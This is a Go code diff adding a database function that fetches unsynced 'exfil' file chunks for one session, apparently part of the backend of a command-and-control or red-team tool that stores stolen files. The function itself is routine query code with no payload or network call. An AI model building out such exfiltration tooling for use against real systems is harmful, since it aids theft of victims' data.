@@ -1156,3 +1156,50 @@ func (d *Database) GetUnsyncedExfilChunks(limit int) ([]map[string]interface{}, 
 
 	return chunks, rows.Err()
 }
+
+// GetUnsyncedExfilChunksForSession retrieves unsynced chunks for a specific session
+func (d *Database) GetUnsyncedExfilChunksForSession(sessionID string, limit int) ([]map[string]interface{}, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	if limit <= 0 {
+		limit = 10000
+	}
+
+	rows, err := d.db.Query(`
+		SELECT c.session_id, c.chunk_index, c.data, s.job_id, s.file_name, s.file_size, s.total_chunks
+		FROM exfil_chunks c
+		JOIN exfil_sessions s ON c.session_id = s.session_id
+		WHERE c.session_id = ? AND c.synced = 0
+		ORDER BY c.chunk_index
+		LIMIT ?
+	`, sessionID, limit)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var chunks []map[string]interface{}
+	for rows.Next() {
+		var sessID, jobID, fileName string
+		var chunkIndex, totalChunks int
+		var fileSize int64
+		var data []byte
+
+		if err := rows.Scan(&sessID, &chunkIndex, &data, &jobID, &fileName, &fileSize, &totalChunks); err != nil {
+			return nil, err
+		}
+
+		chunks = append(chunks, map[string]interface{}{
+			"session_id":   sessID,
+			"chunk_index":  chunkIndex,
+			"data":         data,
+			"job_id":       jobID,
+			"file_name":    fileName,
+			"file_size":    fileSize,
+			"total_chunks": totalChunks,
+		})
+	}
+
+	return chunks, rows.Err()
+}
